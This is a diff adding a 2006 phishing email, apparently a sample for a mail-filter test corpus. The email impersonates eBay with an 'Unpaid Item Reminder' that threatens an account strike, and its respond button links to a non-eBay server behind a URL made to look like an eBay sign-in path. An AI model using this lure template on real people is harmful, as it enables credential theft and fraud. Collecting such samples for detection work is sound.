@@ -1,0 +1,115 @@
+From nobody Sun Jan 25 13:48:13 2015
+Return-Path: <user1@localhost.localhost>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 2B7FE537387
+ for <nobody@login.example.com>; Wed, 22 Feb 2006 21:51:03 -0500 (EST)
+Received: from localhost (nc-65-173-94-144.sta.sprint-hsd.net [65.173.94.144])
+ by mail2.example.com (Postfix) with ESMTP id 4C5176FA1EF
+ for <nobody@example.com>; Wed, 22 Feb 2006 21:50:55 -0500 (EST)
+Received: by localhost (Postfix, from userid 1038)
+ id CD08A170B35; Wed, 22 Feb 2006 12:39:51 -0500 (EST)
+To: nobody@example.com
+Subject: Unpaid eBay Item Reminder: #7591035721
+Message-ID: <1140629991.29413.qmail@eBay.com>
+From: "aw-confirm@eBay.com" <aw-confirm@eBay.com>
+Content-Type: text/html
+Date: Wed, 22 Feb 2006 12:39:51 -0500 (EST)
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 446
+
+<html>
+<head>
+<!--eBay V3- msxml 4.0 XXXXXXXXXXXXXXXXXXXXXXXXXX-->
+<!--srcId: EmailODRUPIReminder-->
+<title>eBay Unpaid Item Reminder: #7557660205</title>
+<style>
+
+#message .SectionTitle {font-size: small; font-family: arial, sans-serif; font-weight:bold }
+#message .SmallTitle {font-size: x-small; font-family: arial, sans-serif; font-weight:bold }
+#message .SectionBody {font-size: x-small; font-family: arial, sans-serif}
+#message .DetailTable, #message .DetailTable th {font-size: 10 pt; font-family: arial, sans-serif; font-weight:normal }
+#message .Title {font-size: medium; font-family: verdana, arial, sans-serif}
+#message .BodyFont {font-size: 10 pt; font-family: arial, sans-serif; font-weight:normal}
+#message .BodyFontStrong {font-size: 10 pt; font-family: arial, sans-serif; font-weight:bold}
+#message .SmallBody {font-size: xx-small; font-family: arial, sans-serif; font-weight:normal; margin-top: 8 px;  margin-bottom: 6 px}
+#message .Separator { COLOR: #CCCCCC; height: 1px}
+#message .HighlightedSeparator { COLOR: #FFCC00; height: 1px}
+#message .FooterSeparator { COLOR: #CCCCCC; height: 1px}
+#message .Footer, #message .Footer p {font-size: xx-small; font-family:arial, sans-serif; color:#666666; margin-top: 2 px;  margin-bottom: 8 px}
+#message .SmallPara, #message .SmallParap {margin-top: 8 px;  margin-bottom: 6 px}
+</style>
+<style xmlns:x="urn:schemas-microsoft-com:xslt">                #message .ItemTitle {font-size: 10pt; font-family: arial, sans-serif; font-weight:bold }</style>
+</head>
+<xbody bgcolor="#FFFFFF">
+<table cellpadding="0" cellspacing="0" width="600">
+<tr>
+<td width="600" style="word-wrap: break-word;">
+<table cellpadding="0" cellspacing="0" width="600" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td width="600" style="word-wrap: break-word;">
+<table cellpadding="2" cellspacing="0" border="0" bgcolor="#EEEEF8" width="100%">
+<tr>
+<td width="2"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif"  width="2"></td>
+<td>
+<font size="4" face="Arial">eBay Unpaid Item Reminder: #7557660205</font>
+</td>
+<td valign="middle"><a target="_blank"  href="http://www.ebay.com/ebaymotors/" ><img src="http://pics.ebaystatic.com/aw/pics/email/eBayLogo.gif"  border="0" align="right"></a></td>
+</tr>
+<tr bgcolor="#9999CC" height="2">
+<td colspan="3"></td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td>
+<table align="center" cellpadding="0" cellspacing="0" border="0" width="94%" style="font-size: x-small; font-family: arial, sans-serif">
+<tr>
+<td><br><br>
+				Dear eBay Member:
+				<br><br></td>
+</tr>
+<tr>
+<td>kwikdigital has informed us that they have not yet received your payment for the following item:
+				<br>CANON IR 8500 w/ NetworkPrinter +K3N FINISHER 85PPM - (#7557660205)
+				<br><br>
+				
+				No action is being taken against your account at this time. However, it is important to remember that when you bid on or 
+				buy an item you are agreeing to a contract between you and the seller. If the situation isn't resolved within 7 days of this 
+				reminder, you may receive an Unpaid Item strike under eBay's
+				
+				<a target="_blank"  href="http://pages.ebay.com/ebaymotors/help/policies/unpaid-item.html" >Unpaid Item Policy</a>.
+
+				<br><br><a target="_blank"  
+href="http://server.7-5naira.com/sys_cpanel/images/eBayISAPIdllSignIncopartnerId2pUserIdsiteidpageTypepai1bshowgifUsingSSLrupppaerrmsgrunameruparamsruproductsidfavoritenavmigrateVisitor.html" >
+<img src="http://pics.ebaystatic.com/aw/pics//email/btnRespond.gif "  alt="Respond to this notification"></a>.
+						
+				<br><br>
+				If you don't respond by Feb-23-2006
+				you may receive an Unpaid Item strike.
+				<br><br>
+				Most Unpaid Item disputes can be resolved through direct communication between the buyer and seller, 
+				and we encourage you to work with your trading partner to reach a resolution.
+				
+				<br><br></td>
+</tr>
+<tr>
+<td>
+				Regards,
+				<br><br>
+				eBay
+			</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</xbody>
+</html>
